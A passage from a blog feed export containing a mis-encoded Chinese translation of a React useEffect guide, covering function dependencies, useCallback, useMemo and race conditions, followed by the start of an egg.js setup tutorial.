Re-triggers all effects on every render function getFetchUrl(query) &#123; return 'https://hn.algolia.com/api/v1/search?query=' + query; &#125; useEffect(() =&gt; &#123; const url = getFetchUrl('react'); // ... Fetch data and do something ... &#125;, [getFetchUrl]); // ğŸš§ Deps are correct but they change too often useEffect(() =&gt; &#123; const url = getFetchUrl('redux'); // ... Fetch data and do something ... &#125;, [getFetchUrl]); // ğŸš§ Deps are correct but they change too often // ...&#125; ä¸€ä¸ªå¯èƒ½çš„è§£å†³åŠæ³•æ˜¯æŠŠgetFetchUrlä»ä¾èµ–ä¸­å»æ‰ã€‚ä½†æ˜¯ï¼Œæˆ‘ä¸è®¤ä¸ºè¿™æ˜¯å¥½çš„è§£å†³æ–¹å¼ã€‚è¿™ä¼šä½¿æˆ‘ä»¬åé¢å¯¹æ•°æ®æµçš„æ”¹å˜å¾ˆéš¾è¢«å‘ç°ä»è€Œå¿˜è®°å»å¤„ç†ã€‚è¿™ä¼šå¯¼è‡´ç±»ä¼¼äºä¸Šé¢â€œå®šæ—¶å™¨ä¸æ›´æ–°å€¼â€çš„é—®é¢˜ã€‚ ç›¸åçš„ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæ›´ç®€å•çš„è§£å†³åŠæ³•ã€‚ ç¬¬ä¸€ä¸ªï¼Œ å¦‚æœä¸€ä¸ªå‡½æ•°æ²¡æœ‰ä½¿ç”¨ç»„ä»¶å†…çš„ä»»ä½•å€¼ï¼Œä½ åº”è¯¥æŠŠå®ƒæåˆ°ç»„ä»¶å¤–é¢å»å®šä¹‰ï¼Œç„¶åå°±å¯ä»¥è‡ªç”±åœ°åœ¨effectsä¸­ä½¿ç”¨ï¼š 1234567891011121314// âœ… Not affected by the data flowfunction getFetchUrl(query) &#123; return 'https://hn.algolia.com/api/v1/search?query=' + query;&#125;function SearchResults() &#123; useEffect(() =&gt; &#123; const url = getFetchUrl('react'); // ... Fetch data and do something ... &#125;, []); // âœ… Deps are OK useEffect(() =&gt; &#123; const url = getFetchUrl('redux'); // ... Fetch data and do something ... &#125;, []); // âœ… Deps are OK // ...&#125; ä½ ä¸å†éœ€è¦æŠŠå®ƒè®¾ä¸ºä¾èµ–ï¼Œå› ä¸ºå®ƒä»¬ä¸åœ¨æ¸²æŸ“èŒƒå›´å†…ï¼Œå› æ­¤ä¸ä¼šè¢«æ•°æ®æµå½±å“ã€‚å®ƒä¸å¯èƒ½çªç„¶æ„å¤–åœ°ä¾èµ–äºpropsæˆ–stateã€‚ æˆ–è€…ï¼Œ ä½ ä¹Ÿå¯ä»¥æŠŠå®ƒåŒ…è£…æˆ useCallback Hook: 1234567891011121314function SearchResults() &#123; // âœ… Preserves identity when its own deps are the same const getFetchUrl = useCallback((query) =&gt; &#123; return 'https://hn.algolia.com/api/v1/search?query=' + query; &#125;, []); // âœ… Callback deps are OK useEffect(() =&gt; &#123; const url = getFetchUrl('react'); // ... Fetch data and do something ... &#125;, [getFetchUrl]); // âœ… Effect deps are OK useEffect(() =&gt; &#123; const url = getFetchUrl('redux'); // ... Fetch data and do something ... &#125;, [getFetchUrl]); // âœ… Effect deps are OK // ...&#125; useCallbackæœ¬è´¨ä¸Šæ˜¯æ·»åŠ äº†ä¸€å±‚ä¾èµ–æ£€æŸ¥ã€‚å®ƒä»¥å¦ä¸€ç§æ–¹å¼è§£å†³äº†é—®é¢˜ - æˆ‘ä»¬ä½¿å‡½æ•°æœ¬èº«åªåœ¨éœ€è¦çš„æ—¶å€™æ‰æ”¹å˜ï¼Œè€Œä¸æ˜¯å»æ‰å¯¹å‡½æ•°çš„ä¾èµ–ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹ä¸ºä»€ä¹ˆè¿™ç§æ–¹å¼æ˜¯æœ‰ç”¨çš„ã€‚ä¹‹å‰ï¼Œæˆ‘ä»¬çš„ä¾‹å­ä¸­å±•ç¤ºäº†ä¸¤ç§æœç´¢ç»“æœï¼ˆæŸ¥è¯¢æ¡ä»¶åˆ†åˆ«ä¸º&#39;react&#39;å’Œ&#39;redux&#39;ï¼‰ã€‚ä½†å¦‚æœæˆ‘ä»¬æƒ³æ·»åŠ ä¸€ä¸ªè¾“å…¥æ¡†å…è®¸ä½ è¾“å…¥ä»»æ„çš„æŸ¥è¯¢æ¡ä»¶(query)ã€‚ä¸åŒäºä¼ é€’queryå‚æ•°çš„æ–¹å¼ï¼Œç°åœ¨getFetchUrlä¼šä»çŠ¶æ€ä¸­è¯»å–ã€‚ æˆ‘ä»¬å¾ˆå¿«å‘ç°å®ƒé—æ¼äº†queryä¾èµ–ï¼š 123456function SearchResults() &#123; const [query, setQuery] = useState('react'); const getFetchUrl = useCallback(() =&gt; &#123; // No query argument return 'https://hn.algolia.com/api/v1/search?query=' + query; &#125;, []); // ğŸ”´ Missing dep: query // ...&#125; å¦‚æœæˆ‘æŠŠqueryæ·»åŠ åˆ°useCallback çš„ä¾èµ–ä¸­ï¼Œä»»ä½•è°ƒç”¨äº†getFetchUrlçš„effectåœ¨queryæ”¹å˜åéƒ½ä¼šé‡æ–°è¿è¡Œï¼š 1234567891011function SearchResults() &#123; const [query, setQuery] = useState('react'); // âœ… Preserves identity until query changes const getFetchUrl = useCallback(() =&gt; &#123; return 'https://hn.algolia.com/api/v1/search?query=' + query; &#125;, [query]); // âœ… Callback deps are OK useEffect(() =&gt; &#123; const url = getFetchUrl(); // ... Fetch data and do something ... &#125;, [getFetchUrl]); // âœ… Effect deps are OK // ...&#125; æˆ‘ä»¬è¦æ„Ÿè°¢useCallbackï¼Œå› ä¸ºå¦‚æœquery ä¿æŒä¸å˜ï¼ŒgetFetchUrlä¹Ÿä¼šä¿æŒä¸å˜ï¼Œæˆ‘ä»¬çš„effectä¹Ÿä¸ä¼šé‡æ–°è¿è¡Œã€‚ä½†æ˜¯å¦‚æœqueryä¿®æ”¹äº†ï¼ŒgetFetchUrlä¹Ÿä¼šéšä¹‹æ”¹å˜ï¼Œå› æ­¤ä¼šé‡æ–°è¯·æ±‚æ•°æ®ã€‚è¿™å°±åƒä½ åœ¨Excelé‡Œä¿®æ”¹äº†ä¸€ä¸ªå•å…ƒæ ¼çš„å€¼ï¼Œå¦ä¸€ä¸ªä½¿ç”¨å®ƒçš„å•å…ƒæ ¼ä¼šè‡ªåŠ¨é‡æ–°è®¡ç®—ä¸€æ ·ã€‚ è¿™æ­£æ˜¯æ‹¥æŠ±æ•°æ®æµå’ŒåŒæ­¥æ€ç»´çš„ç»“æœã€‚å¯¹äºé€šè¿‡å±æ€§ä»çˆ¶ç»„ä»¶ä¼ å…¥çš„å‡½æ•°è¿™ä¸ªæ–¹æ³•ä¹Ÿé€‚ç”¨ï¼š 12345678910111213141516function Parent() &#123; const [query, setQuery] = useState('react'); // âœ… Preserves identity until query changes const fetchData = useCallback(() =&gt; &#123; const url = 'https://hn.algolia.com/api/v1/search?query=' + query; // ... Fetch data and return it ... &#125;, [query]); // âœ… Callback deps are OK return &lt;Child fetchData=&#123;fetchData&#125; /&gt;&#125;function Child(&#123; fetchData &#125;) &#123; let [data, setData] = useState(null); useEffect(() =&gt; &#123; fetchData().then(setData); &#125;, [fetchData]); // âœ… Effect deps are OK // ...&#125; å› ä¸ºfetchDataåªæœ‰åœ¨Parentçš„queryçŠ¶æ€å˜æ›´æ—¶æ‰ä¼šæ”¹å˜ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„Childåªä¼šåœ¨éœ€è¦çš„æ—¶å€™æ‰å»é‡æ–°è¯·æ±‚æ•°æ®ã€‚ å‡½æ•°æ˜¯æ•°æ®æµçš„ä¸€éƒ¨åˆ†å—ï¼Ÿæœ‰è¶£çš„æ˜¯ï¼Œè¿™ç§æ¨¡å¼åœ¨classç»„ä»¶ä¸­è¡Œä¸é€šï¼Œå¹¶ä¸”è¿™ç§è¡Œä¸é€šæ°åˆ°å¥½å¤„åœ°æ­ç¤ºäº†effectå’Œç”Ÿå‘½å‘¨æœŸèŒƒå¼ä¹‹é—´çš„åŒºåˆ«ã€‚è€ƒè™‘ä¸‹é¢çš„è½¬æ¢ï¼š 1234567891011121314151617class Parent extends Component &#123; state = &#123; query: 'react' &#125;; fetchData = () =&gt; &#123; const url = 'https://hn.algolia.com/api/v1/search?query=' + this.state.query; // ... Fetch data and do something ... &#125;; render() &#123; return &lt;Child fetchData=&#123;this.fetchData&#125; /&gt;; &#125;&#125;class Child extends Component &#123; state = &#123; data: null &#125;; componentDidMount() &#123; this.props.fetchData(); &#125; render() &#123; // ... &#125;&#125; ä½ å¯èƒ½ä¼šæƒ³ï¼šâ€œå°‘æ¥äº†Danï¼Œæˆ‘ä»¬éƒ½çŸ¥é“useEffect å°±åƒcomponentDidMount å’Œ componentDidUpdateçš„ç»“åˆï¼Œä½ ä¸èƒ½è€æ˜¯ç ´åè¿™ä¸€æ¡ï¼â€å¥½å§ï¼Œå°±ç®—åŠ äº†componentDidUpdateç…§æ ·æ— ç”¨ï¼š 1234567891011class Child extends Component &#123; state = &#123; data: null &#125;; componentDidMount() &#123; this.props.fetchData(); &#125; componentDidUpdate(prevProps) &#123; // ğŸ”´ This condition will never be true if (this.props.fetchData !== prevProps.fetchData) &#123; this.props.fetchData(); &#125; &#125; render() &#123; // ... &#125;&#125; å½“ç„¶å¦‚æ­¤ï¼ŒfetchDataæ˜¯ä¸€ä¸ªclassæ–¹æ³•ï¼ï¼ˆæˆ–è€…ä½ ä¹Ÿå¯ä»¥è¯´æ˜¯classå±æ€§ - ä½†è¿™ä¸èƒ½æ”¹å˜ä»€ä¹ˆã€‚ï¼‰å®ƒä¸ä¼šå› ä¸ºçŠ¶æ€çš„æ”¹å˜è€Œä¸åŒï¼Œæ‰€ä»¥this.props.fetchDataå’Œ prevProps.fetchDataå§‹ç»ˆç›¸ç­‰ï¼Œå› æ­¤ä¸ä¼šé‡æ–°è¯·æ±‚ã€‚é‚£æˆ‘ä»¬åˆ æ‰æ¡ä»¶åˆ¤æ–­æ€ä¹ˆæ ·ï¼Ÿ 123componentDidUpdate(prevProps) &#123; this.props.fetchData();&#125; ç­‰ç­‰ï¼Œè¿™æ ·ä¼šåœ¨æ¯æ¬¡æ¸²æŸ“åéƒ½å»è¯·æ±‚ã€‚(æ·»åŠ ä¸€ä¸ªåŠ è½½åŠ¨ç”»å¯èƒ½æ˜¯ä¸€ç§æœ‰è¶£çš„å‘ç°è¿™ç§æƒ…å†µçš„æ–¹å¼ã€‚)ä¹Ÿè®¸æˆ‘ä»¬å¯ä»¥ç»‘å®šä¸€ä¸ªç‰¹å®šçš„query? 123render() &#123; return &lt;Child fetchData=&#123;this.fetchData.bind(this, this.state.query)&#125; /&gt;;&#125; ä½†è¿™æ ·ä¸€æ¥ï¼Œthis.props.fetchData !== prevProps.fetchData è¡¨è¾¾å¼æ°¸è¿œæ˜¯trueï¼Œå³ä½¿queryå¹¶æœªæ”¹å˜ã€‚è¿™ä¼šå¯¼è‡´æˆ‘ä»¬æ€»æ˜¯å»è¯·æ±‚ã€‚ æƒ³è¦è§£å†³è¿™ä¸ªclassç»„ä»¶ä¸­çš„éš¾é¢˜ï¼Œå”¯ä¸€ç°å®å¯è¡Œçš„åŠæ³•æ˜¯ç¡¬ç€å¤´çš®æŠŠqueryæœ¬èº«ä¼ å…¥ Child ç»„ä»¶ã€‚ Child è™½ç„¶å®é™…å¹¶æ²¡æœ‰ç›´æ¥ä½¿ç”¨è¿™ä¸ªqueryçš„å€¼ï¼Œä½†èƒ½åœ¨å®ƒæ”¹å˜çš„æ—¶å€™è§¦å‘ä¸€æ¬¡é‡æ–°è¯·æ±‚ï¼š 12345678910111213141516171819202122232425class Parent extends Component &#123; state = &#123; query: 'react' &#125;; fetchData = () =&gt; &#123; const url = 'https://hn.algolia.com/api/v1/search?query=' + this.state.query; // ... Fetch data and do something ... &#125;; render() &#123; return &lt;Child fetchData=&#123;this.fetchData&#125; query=&#123;this.state.query&#125; /&gt;; &#125;&#125;class Child extends Component &#123; state = &#123; data: null &#125;; componentDidMount() &#123; this.props.fetchData(); &#125; componentDidUpdate(prevProps) &#123; if (this.props.query !== prevProps.query) &#123; this.props.fetchData(); &#125; &#125; render() &#123; // ... &#125;&#125; åœ¨ä½¿ç”¨Reactçš„classç»„ä»¶è¿™ä¹ˆå¤šå¹´åï¼Œæˆ‘å·²ç»å¦‚æ­¤ä¹ æƒ¯äºæŠŠä¸å¿…è¦çš„propsä¼ é€’ä¸‹å»å¹¶ä¸”ç ´åçˆ¶ç»„ä»¶çš„å°è£…ä»¥è‡³äºæˆ‘åœ¨ä¸€å‘¨ä¹‹å‰æ‰æ„è¯†åˆ°æˆ‘ä¸ºä»€ä¹ˆä¸€å®šè¦è¿™æ ·åšã€‚ åœ¨classç»„ä»¶ä¸­ï¼Œå‡½æ•°å±æ€§æœ¬èº«å¹¶ä¸æ˜¯æ•°æ®æµçš„ä¸€éƒ¨åˆ†ã€‚ç»„ä»¶çš„æ–¹æ³•ä¸­åŒ…å«äº†å¯å˜çš„thiså˜é‡å¯¼è‡´æˆ‘ä»¬ä¸èƒ½ç¡®å®šæ— ç–‘åœ°è®¤ä¸ºå®ƒæ˜¯ä¸å˜çš„ã€‚å› æ­¤ï¼Œå³ä½¿æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬ä¹Ÿå¿…é¡»æŠŠä¸€å †æ•°æ®ä¼ é€’ä¸‹å»ä»…ä»…æ˜¯ä¸ºäº†åšâ€œdiffâ€ã€‚æˆ‘ä»¬æ— æ³•çŸ¥é“ä¼ å…¥çš„this.props.fetchData æ˜¯å¦ä¾èµ–çŠ¶æ€ï¼Œå¹¶ä¸”ä¸çŸ¥é“å®ƒä¾èµ–çš„çŠ¶æ€æ˜¯å¦æ”¹å˜äº†ã€‚ ä½¿ç”¨useCallbackï¼Œå‡½æ•°å®Œå…¨å¯ä»¥å‚ä¸åˆ°æ•°æ®æµä¸­ã€‚æˆ‘ä»¬å¯ä»¥è¯´å¦‚æœä¸€ä¸ªå‡½æ•°çš„è¾“å…¥æ”¹å˜äº†ï¼Œè¿™ä¸ªå‡½æ•°å°±æ”¹å˜äº†ã€‚å¦‚æœæ²¡æœ‰ï¼Œå‡½æ•°ä¹Ÿä¸ä¼šæ”¹å˜ã€‚æ„Ÿè°¢å‘¨åˆ°çš„useCallbackï¼Œå±æ€§æ¯”å¦‚props.fetchDataçš„æ”¹å˜ä¹Ÿä¼šè‡ªåŠ¨ä¼ é€’ä¸‹å»ã€‚ ç±»ä¼¼çš„ï¼ŒuseMemoå¯ä»¥è®©æˆ‘ä»¬å¯¹å¤æ‚å¯¹è±¡åšç±»ä¼¼çš„äº‹æƒ…ã€‚ 1234567function ColorPicker() &#123; // Doesn't break Child's shallow equality prop check // unless the color actually changes. const [color, setColor] = useState('pink'); const style = useMemo(() =&gt; (&#123; color &#125;), [color]); return &lt;Child style=&#123;style&#125; /&gt;;&#125; æˆ‘æƒ³å¼ºè°ƒçš„æ˜¯ï¼Œåˆ°å¤„ä½¿ç”¨useCallbackæ˜¯ä»¶æŒºç¬¨æ‹™çš„äº‹ã€‚å½“æˆ‘ä»¬éœ€è¦å°†å‡½æ•°ä¼ é€’ä¸‹å»å¹¶ä¸”å‡½æ•°ä¼šåœ¨å­ç»„ä»¶çš„effectä¸­è¢«è°ƒç”¨çš„æ—¶å€™ï¼ŒuseCallback æ˜¯å¾ˆå¥½çš„æŠ€å·§ä¸”éå¸¸æœ‰ç”¨ã€‚æˆ–è€…ä½ æƒ³è¯•å›¾å‡å°‘å¯¹å­ç»„ä»¶çš„è®°å¿†è´Ÿæ‹…ï¼Œä¹Ÿä¸å¦¨ä¸€è¯•ã€‚ä½†æ€»çš„æ¥è¯´Hooksæœ¬èº«èƒ½æ›´å¥½åœ°é¿å…ä¼ é€’å›è°ƒå‡½æ•°ã€‚ åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘æ›´å€¾å‘äºæŠŠfetchDataæ”¾åœ¨æˆ‘çš„effecté‡Œï¼ˆå®ƒå¯ä»¥æŠ½ç¦»æˆä¸€ä¸ªè‡ªå®šä¹‰Hookï¼‰æˆ–è€…æ˜¯ä»é¡¶å±‚å¼•å…¥ã€‚æˆ‘æƒ³è®©effectsä¿æŒç®€å•ï¼Œè€Œåœ¨é‡Œé¢è°ƒç”¨å›è°ƒä¼šè®©äº‹æƒ…å˜å¾—å¤æ‚ã€‚ï¼ˆâ€œå¦‚æœæŸä¸ªprops.onCompleteå›è°ƒæ”¹å˜äº†è€Œè¯·æ±‚è¿˜åœ¨è¿›è¡Œä¸­ä¼šæ€ä¹ˆæ ·ï¼Ÿâ€ï¼‰ä½ å¯ä»¥æ¨¡æ‹Ÿclassçš„è¡Œä¸ºä½†é‚£æ ·å¹¶ä¸èƒ½è§£å†³ç«æ€çš„é—®é¢˜ã€‚ è¯´è¯´ç«æ€ä¸‹é¢æ˜¯ä¸€ä¸ªå…¸å‹çš„åœ¨classç»„ä»¶é‡Œå‘è¯·æ±‚çš„ä¾‹å­ï¼š 12345678910111213class Article extends Component &#123; state = &#123; article: null &#125;; componentDidMount() &#123; this.fetchData(this.props.id); &#125; async fetchData(id) &#123; const article = await API.fetchArticle(id); this.setState(&#123; article &#125;); &#125; // ...&#125; ä½ å¾ˆå¯èƒ½å·²ç»çŸ¥é“ï¼Œä¸Šé¢çš„ä»£ç åŸ‹ä¼äº†ä¸€äº›é—®é¢˜ã€‚å®ƒå¹¶æ²¡æœ‰å¤„ç†æ›´æ–°çš„æƒ…å†µã€‚æ‰€ä»¥ç¬¬äºŒä¸ªä½ èƒ½å¤Ÿåœ¨ç½‘ä¸Šæ‰¾åˆ°çš„ç»å…¸ä¾‹å­æ˜¯ä¸‹é¢è¿™æ ·çš„ï¼š 12345678910111213class Article extends Component &#123; state = &#123; article: null &#125;; componentDidMount() &#123; this.fetchData(this.props.id); &#125; componentDidUpdate(prevProps) &#123; if (prevProps.id !== this.props.id) &#123; this.fetchData(this.props.id); &#125; &#125; async fetchData(id) &#123; const article = await API.fetchArticle(id); this.setState(&#123; article &#125;); &#125; // ...&#125; è¿™æ˜¾ç„¶å¥½å¤šäº†ï¼ä½†ä¾æ—§æœ‰é—®é¢˜ã€‚æœ‰é—®é¢˜çš„åŸå› æ˜¯è¯·æ±‚ç»“æœè¿”å›çš„é¡ºåºä¸èƒ½ä¿è¯ä¸€è‡´ã€‚æ¯”å¦‚æˆ‘å…ˆè¯·æ±‚ {id: 10}ï¼Œç„¶åæ›´æ–°åˆ°{id: 20}ï¼Œä½†{id: 20}çš„è¯·æ±‚æ›´å…ˆè¿”å›ã€‚è¯·æ±‚æ›´æ—©ä½†è¿”å›æ›´æ™šçš„æƒ…å†µä¼šé”™è¯¯åœ°è¦†ç›–çŠ¶æ€å€¼ã€‚ è¿™è¢«å«åšç«æ€ï¼Œè¿™åœ¨æ··åˆäº†async / awaitï¼ˆå‡è®¾åœ¨ç­‰å¾…ç»“æœè¿”å›ï¼‰å’Œè‡ªé¡¶å‘ä¸‹æ•°æ®æµçš„ä»£ç ä¸­éå¸¸å…¸å‹ï¼ˆpropså’Œstateå¯èƒ½ä¼šåœ¨asyncå‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­å‘ç”Ÿæ”¹å˜ï¼‰ã€‚ Effectså¹¶æ²¡æœ‰ç¥å¥‡åœ°è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå°½ç®¡å®ƒä¼šè­¦å‘Šä½ å¦‚æœä½ ç›´æ¥ä¼ äº†ä¸€ä¸ªasync å‡½æ•°ç»™effectã€‚ï¼ˆæˆ‘ä»¬ä¼šæ”¹å–„è¿™ä¸ªè­¦å‘Šæ¥æ›´å¥½åœ°è§£é‡Šä½ å¯èƒ½ä¼šé‡åˆ°çš„è¿™äº›é—®é¢˜ã€‚ï¼‰ å¦‚æœä½ ä½¿ç”¨çš„å¼‚æ­¥æ–¹å¼æ”¯æŒå–æ¶ˆï¼Œé‚£å¤ªæ£’äº†ã€‚ä½ å¯ä»¥ç›´æ¥åœ¨æ¸…é™¤å‡½æ•°ä¸­å–æ¶ˆå¼‚æ­¥è¯·æ±‚ã€‚ æˆ–è€…ï¼Œæœ€ç®€å•çš„æƒå®œä¹‹è®¡æ˜¯ç”¨ä¸€ä¸ªå¸ƒå°”å€¼æ¥è·Ÿè¸ªå®ƒï¼š 1234567891011121314151617function Article(&#123; id &#125;) &#123; const [article, setArticle] = useState(null); useEffect(() =&gt; &#123; let didCancel = false; async function fetchData() &#123; const article = await API.fetchArticle(id); if (!didCancel) &#123; setArticle(article); &#125; &#125; fetchData(); return () =&gt; &#123; didCancel = true; &#125;; &#125;, [id]); // ...&#125; è¿™ç¯‡æ–‡ç« è®¨è®ºäº†æ›´å¤šå…³äºå¦‚ä½•å¤„ç†é”™è¯¯å’ŒåŠ è½½çŠ¶æ€ï¼Œä»¥åŠæŠ½ç¦»é€»è¾‘åˆ°è‡ªå®šä¹‰çš„Hookã€‚æˆ‘æ¨èä½ è®¤çœŸé˜…è¯»ä¸€ä¸‹å¦‚æœä½ æƒ³å­¦ä¹ æ›´å¤šå…³äºå¦‚ä½•åœ¨Hooksé‡Œè¯·æ±‚æ•°æ®çš„å†…å®¹ã€‚ æé«˜æ°´å‡†åœ¨classç»„ä»¶ç”Ÿå‘½å‘¨æœŸçš„æ€ç»´æ¨¡å‹ä¸­ï¼Œå‰¯ä½œç”¨çš„è¡Œä¸ºå’Œæ¸²æŸ“è¾“å‡ºæ˜¯ä¸åŒçš„ã€‚UIæ¸²æŸ“æ˜¯è¢«propså’Œstateé©±åŠ¨çš„ï¼Œå¹¶ä¸”èƒ½ç¡®ä¿æ­¥è°ƒä¸€è‡´ï¼Œä½†å‰¯ä½œç”¨å¹¶ä¸æ˜¯è¿™æ ·ã€‚è¿™æ˜¯ä¸€ç±»å¸¸è§é—®é¢˜çš„æ¥æºã€‚ è€Œåœ¨useEffectçš„æ€ç»´æ¨¡å‹ä¸­ï¼Œé»˜è®¤éƒ½æ˜¯åŒæ­¥çš„ã€‚å‰¯ä½œç”¨å˜æˆäº†Reactæ•°æ®æµçš„ä¸€éƒ¨åˆ†ã€‚å¯¹äºæ¯ä¸€ä¸ªuseEffectè°ƒç”¨ï¼Œä¸€æ—¦ä½ å¤„ç†æ­£ç¡®ï¼Œä½ çš„ç»„ä»¶èƒ½å¤Ÿæ›´å¥½åœ°å¤„ç†è¾¹ç¼˜æƒ…å†µã€‚ ç„¶è€Œï¼Œç”¨å¥½useEffectçš„å‰æœŸå­¦ä¹ æˆæœ¬æ›´é«˜ã€‚è¿™å¯èƒ½è®©äººæ°”æ¼ã€‚ç”¨åŒæ­¥çš„ä»£ç å»å¤„ç†è¾¹ç¼˜æƒ…å†µå¤©ç„¶å°±æ¯”è§¦å‘ä¸€æ¬¡ä¸ç”¨å’Œæ¸²æŸ“ç»“æœæ­¥è°ƒä¸€è‡´çš„å‰¯ä½œç”¨æ›´éš¾ã€‚ è¿™éš¾å…è®©äººæ‹…å¿§å¦‚æœuseEffectæ˜¯ä½ ç°åœ¨ä½¿ç”¨æœ€å¤šçš„å·¥å…·ã€‚ä¸è¿‡ï¼Œç›®å‰å¤§æŠµè¿˜å¤„ç†ä½æ°´å¹³ä½¿ç”¨é˜¶æ®µã€‚å› ä¸ºHookså¤ªæ–°äº†æ‰€ä»¥å¤§å®¶éƒ½è¿˜åœ¨ä½æ°´å¹³åœ°ä½¿ç”¨å®ƒï¼Œå°¤å…¶æ˜¯åœ¨ä¸€äº›æ•™ç¨‹ç¤ºä¾‹ä¸­ã€‚ä½†åœ¨å®è·µä¸­ï¼Œç¤¾åŒºå¾ˆå¯èƒ½å³å°†å¼€å§‹é«˜æ°´å¹³åœ°ä½¿ç”¨Hooksï¼Œå› ä¸ºå¥½çš„APIä¼šæœ‰æ›´å¥½çš„åŠ¨é‡å’Œå†²åŠ²ã€‚ æˆ‘çœ‹åˆ°ä¸åŒçš„åº”ç”¨åœ¨åˆ›é€ ä»–ä»¬è‡ªå·±çš„Hooksï¼Œæ¯”å¦‚å°è£…äº†åº”ç”¨é‰´æƒé€»è¾‘çš„useFetchæˆ–è€…ä½¿ç”¨theme contextçš„useTheme ã€‚ä½ ä¸€æ—¦æœ‰äº†åŒ…å«è¿™äº›çš„å·¥å…·ç®±ï¼Œä½ å°±ä¸ä¼šé‚£ä¹ˆé¢‘ç¹åœ°ç›´æ¥ä½¿ç”¨useEffectã€‚ä½†æ¯ä¸€ä¸ªåŸºäºå®ƒçš„Hookéƒ½èƒ½ä»å®ƒçš„é€‚åº”èƒ½åŠ›ä¸­å¾—åˆ°ç›Šå¤„ã€‚ ç›®å‰ä¸ºæ­¢ï¼ŒuseEffectä¸»è¦ç”¨äºæ•°æ®è¯·æ±‚ã€‚ä½†æ˜¯æ•°æ®è¯·æ±‚å‡†ç¡®è¯´å¹¶ä¸æ˜¯ä¸€ä¸ªåŒæ­¥é—®é¢˜ã€‚å› ä¸ºæˆ‘ä»¬çš„ä¾èµ–ç»å¸¸æ˜¯[]æ‰€ä»¥è¿™ä¸€ç‚¹å°¤å…¶æ˜æ˜¾ã€‚é‚£æˆ‘ä»¬ç©¶ç«Ÿåœ¨åŒæ­¥ä»€ä¹ˆï¼Ÿ é•¿è¿œæ¥çœ‹ï¼Œ Suspenseç”¨äºæ•°æ®è¯·æ±‚ ä¼šå…è®¸ç¬¬ä¸‰æ–¹åº“é€šè¿‡ç¬¬ä¸€ç­‰çš„é€”å¾„å‘Šè¯‰Reactæš‚åœæ¸²æŸ“ç›´åˆ°æŸäº›å¼‚æ­¥äº‹ç‰©ï¼ˆä»»ä½•ä¸œè¥¿ï¼šä»£ç ï¼Œæ•°æ®ï¼Œå›¾ç‰‡ï¼‰å·²ç»å‡†å¤‡å°±ç»ªã€‚ å½“Suspenseé€æ¸åœ°è¦†ç›–åˆ°æ›´å¤šçš„æ•°æ®è¯·æ±‚ä½¿ç”¨åœºæ™¯ï¼Œæˆ‘é¢„æ–™useEffect ä¼šé€€å±…å¹•åä½œä¸ºä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œç”¨äºåŒæ­¥propså’Œstateåˆ°æŸäº›å‰¯ä½œç”¨ã€‚ä¸åƒæ•°æ®è¯·æ±‚ï¼Œå®ƒå¯ä»¥å¾ˆå¥½åœ°å¤„ç†è¿™äº›åœºæ™¯å› ä¸ºå®ƒå°±æ˜¯ä¸ºæ­¤è€Œè®¾è®¡çš„ã€‚ä¸è¿‡åœ¨é‚£ä¹‹å‰ï¼Œè‡ªå®šä¹‰çš„Hooksæ¯”å¦‚è¿™å„¿æåˆ°çš„æ˜¯å¤ç”¨æ•°æ®è¯·æ±‚é€»è¾‘å¾ˆå¥½çš„æ–¹å¼ã€‚ åœ¨ç»“æŸå‰ç°åœ¨ä½ å·®ä¸å¤šçŸ¥é“äº†æˆ‘å…³äºå¦‚ä½•ä½¿ç”¨effectsçš„æ‰€æœ‰çŸ¥è¯†ï¼Œå¯ä»¥æ£€æŸ¥ä¸€ä¸‹å¼€å¤´çš„TLDRã€‚ä½ ç°åœ¨è§‰å¾—å®ƒè¯´å¾—æœ‰é“ç†å—ï¼Ÿæˆ‘æœ‰é—æ¼ä»€ä¹ˆå—ï¼Ÿï¼ˆæˆ‘çš„çº¸è¿˜æ²¡æœ‰å†™å®Œï¼ï¼‰]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[egg-ä»å…¥é—¨åˆ°ä¸Šçº¿ (ä¸Š)]]></title>
    <url>%2F2020%2F03%2F19%2FNode.js%2Fegg-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E4%B8%8A%E7%BA%BF%20(%E4%B8%8A)%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5c99cbdee51d455b251df9eb 1 ç¯å¢ƒæ­å»ºã€åˆ›å»ºã€è¿è¡Œ1.1 ä»‹ç»egg.jsæ˜¯é˜¿é‡Œæ——ä¸‹åŸºäºnode.jså’Œkoaæ˜¯ä¸€ä¸ªnodeä¼ä¸šçº§åº”ç”¨å¼€å‘æ¡†æ¶ï¼Œå¯ä»¥å¸®åŠ©å¼€å‘å›¢é˜Ÿï¼Œå’Œå¼€å‘äººå‘˜å‡å°‘æˆæœ¬ã€‚åŸºäºkoa2ã€es6ã€es7ä½¿å¾—nodeå…·æœ‰æ›´æœ‰è§„èŒƒçš„å¼€å‘æ¨¡å¼ï¼Œæ›´ä½çš„å­¦ä¹ æˆæœ¬ã€æ›´ä¼˜é›…çš„ä»£ç ã€æ›´å°‘çš„ç»´æŠ¤æˆæœ¬ã€‚ 1.2 ç¯å¢ƒæ­å»º1ã€è¦æ±‚nodejsç‰ˆæœ¬å¿…é¡»å¤§äº8.0å¹¶ä¸”è¦ç”¨LTS ç‰ˆæœ¬2ã€åˆ›å»ºeggçš„ç¯å¢ƒ npm i egg-init -g / cnpm i egg-init -g (åªéœ€è¦å®‰è£…ä¸€æ¬¡)3ã€åˆ›å»ºé¡¹ç›® cd åˆ°ç›®å½•é‡Œé¢ ï¼ˆæ³¨æ„ç›®å½•ä¸è¦ç”¨ä¸­æ–‡ ä¸è¦æœ‰ç©ºæ ¼ï¼‰ 1.3 åˆ›å»º1234$ npm i egg-init -g$ egg-init egg-example --type=simple //ä¾‹å¦‚:egg-init é¡¹ç›®åç§° --type=simple$ cd egg-example$ npm i 1.4 è¿è¡Œé¡¹ç›®12npm run dev open localhost:7001 